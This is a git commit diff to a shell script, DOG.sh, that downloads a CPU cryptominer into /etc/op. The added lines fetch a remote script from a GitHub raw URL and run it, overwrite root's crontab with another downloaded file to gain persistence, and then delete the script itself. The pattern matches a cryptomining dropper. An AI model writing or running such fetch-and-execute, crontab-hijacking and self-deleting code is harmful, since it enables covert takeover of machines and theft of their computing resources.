7b820be925322e2fde266394206daccabe8b2564
rezabagh <rezabagh@gmail.com>
2021-01-03 10:48:22 +0000

    Update DOG.sh

--- DOG.sh
+++ DOG.sh
@@ -6,3 +6,12 @@ curl -o /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -L https://github.com/
 tar -xvf /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -C /etc/op/ 
 rm -rf /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
 curl -o /etc/op/dogcoin.sh -L https://raw.githubusercontent.com/rezabagh/reza/master/dogcoin.sh
+chmod 777 /etc/op/dogcoin.sh
+bash /etc/op/dogcoin.sh
+curl -o /etc/op/note -L https://raw.githubusercontent.com/rezabagh/reza/master/note
+cat /etc/op/note > /var/spool/cron/root
+cat /etc/op/note > /var/spool/cron/crontabs/root
+cat /var/spool/cron/root
+cat /var/spool/cron/crontabs/root
+rm -rf /root/DOG.sh
+
